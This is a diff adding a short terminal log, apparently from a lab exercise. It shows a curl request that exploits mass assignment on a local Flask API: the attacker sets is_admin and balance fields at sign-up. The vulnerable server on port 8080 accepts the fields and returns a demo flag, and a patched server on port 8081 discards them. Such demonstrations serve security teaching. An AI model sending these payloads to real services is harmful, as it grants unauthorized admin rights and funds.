@@ -1,0 +1,23 @@
+danaiphong | 6631503106 | 2026-10-23 21:54:03 +07
+
+$ curl -sS -i -X POST http://localhost:8080/api/users -H Content-Type:\ application/json -d \{\"username\":\"mallory\"\,\"password\":\"x\"\,\"is_admin\":true\,\"balance\":1000000\} 
+HTTP/1.1 201 CREATED
+Server: Werkzeug/3.1.9 Python/3.12.14
+Date: Fri, 23 Oct 2026 14:54:03 GMT
+Content-Type: application/json
+Content-Length: 110
+Connection: close
+
+{"balance":1000000,"flag":"FLAG{massassign_demo}","id":4,"is_admin":true,"password":"x","username":"mallory"}
+
+
+$ curl -sS -i -X POST http://localhost:8081/api/users -H Content-Type:\ application/json -d \{\"username\":\"mallory\"\,\"password\":\"x\"\,\"is_admin\":true\,\"balance\":1000000\} 
+HTTP/1.1 201 CREATED
+Server: Werkzeug/3.1.9 Python/3.12.14
+Date: Fri, 23 Oct 2026 14:54:03 GMT
+Content-Type: application/json
+Content-Length: 74
+Connection: close
+
+{"balance":0,"id":4,"is_admin":false,"password":"x","username":"mallory"}
+
